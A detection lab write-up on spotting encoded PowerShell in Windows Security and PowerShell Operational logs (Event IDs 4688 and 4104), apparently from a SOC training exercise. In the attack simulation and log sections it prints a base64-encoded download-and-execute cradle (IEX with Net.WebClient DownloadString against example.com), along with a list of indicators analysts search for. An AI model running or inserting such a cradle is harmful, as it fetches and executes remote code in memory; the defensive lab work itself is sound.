# Suspicious PowerShell Encoded Command Detection Lab

## Overview

This lab demonstrates how suspicious PowerShell activity can be detected using Windows event logs.
Attackers frequently use encoded PowerShell commands to hide malicious scripts and evade detection.

The objective of this lab was to simulate an encoded PowerShell command execution and analyze the relevant Windows logs used by Security Operations Center (SOC) analysts.

---

## Lab Environment

Attacker Machine
Kali Linux VM
IP Address: 192.168.101.130

Target Machine
Windows 10 Workstation
IP Address: 192.168.101.134

Network
Local LAN (192.168.101.0/24)

---

## Attack Simulation

The following encoded PowerShell command was executed on the Windows target machine:

powershell -EncodedCommand SQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACIAKQA=

The encoded command resolves to:

IEX (New-Object Net.WebClient).DownloadString("http://example.com")

This command attempts to download content from a remote website and execute it in memory using Invoke-Expression.

This behavior is commonly observed in fileless malware attacks.

---

## Detection Logs

### Event ID 4688 – Process Creation

Location
Windows Logs → Security

This event recorded the creation of a new PowerShell process.

Key indicators observed:

New Process Name
powershell.exe

Command Line
powershell.exe -EncodedCommand

This indicates that PowerShell was launched with an encoded payload.

---

### Event ID 4104 – PowerShell Script Block Logging

Location
Applications and Services Logs → Microsoft → Windows → PowerShell → Operational

This event revealed the decoded PowerShell command.

Script Block Logged

IEX (New-Object Net.WebClient).DownloadString("http://example.com")

Script Block Logging is extremely valuable because it exposes the actual commands executed, even when attackers attempt to hide them using encoding or obfuscation.

---

## Security Relevance

Encoded PowerShell commands are widely used in cyber attacks because they:

Hide malicious commands
Bypass simple detection rules
Execute code directly in memory

SOC analysts frequently investigate PowerShell commands containing:

-EncodedCommand
Invoke-Expression (IEX)
Net.WebClient
DownloadString

These indicators may signal malware loaders, command and control activity, or fileless attacks.

---

## Conclusion

This lab demonstrates how encoded PowerShell execution can be detected using Windows Security and PowerShell logs.

By analyzing Event ID 4688 and Event ID 4104, security analysts can identify suspicious command execution and uncover hidden scripts used by attackers.

This technique is commonly used in real-world incidents involving PowerShell-based malware and post-exploitation frameworks.
